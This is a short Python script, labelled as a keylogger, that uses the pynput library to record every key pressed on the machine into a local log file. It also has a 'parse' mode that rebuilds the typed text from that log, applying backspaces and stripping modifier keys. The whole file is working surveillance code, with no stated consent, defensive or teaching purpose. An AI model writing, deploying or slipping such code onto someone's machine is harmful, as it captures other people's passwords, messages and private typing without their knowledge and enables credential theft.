import queue
import threading
import re
import sys
from pynput import keyboard

LOG_FILE = "test.log"

key_queue = queue.Queue()

KEY_ACTIONS = {
    'space':     ' ',
    'enter':     '\n',
    'tab':       '\t',
    'backspace': None,
    'shift':     '',
    'shift_r':   '',
    'ctrl':      '',
    'ctrl_r':    '',
    'alt':       '',
    'alt_r':     '',
    'caps_lock': '',
    'up':        '',
    'down':      '',
    'left':      '',
    'right':     '',
    'home':      '',
    'end':       '',
}

# --- keylogger ---

def on_press(key):
    try:
        key_queue.put(key.char)
    except AttributeError:
        key_queue.put(f" [{key}] ")

def writer(q):
    with open(LOG_FILE, "a", buffering=8192) as f:
        while True:
            item = q.get()
            if item is None:
                break
            f.write(item)
            if q.empty():
                f.flush()

def main():
    t = threading.Thread(target=writer, args=(key_queue,), daemon=True)
    t.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    key_queue.put(None)
    t.join()

# --- parser ---

def parse_log(raw: str) -> str:
    buffer = []
    tokens = re.split(r'(\[Key\.\w+\])', raw)

    for token in tokens:
        if not token:
            continue

        if not token.startswith('[Key.'):
            buffer.extend(list(token))
            continue

        key = token[5:-1]
        action = KEY_ACTIONS.get(key, f'[{key}]')

        if action is None:
            if buffer:
                buffer.pop()
        else:
            if action:
                buffer.append(action)

    return ''.join(buffer)

# --- entry point ---

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == 'parse':
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            raw = f.read()
        print(parse_log(raw))
    else:
        main()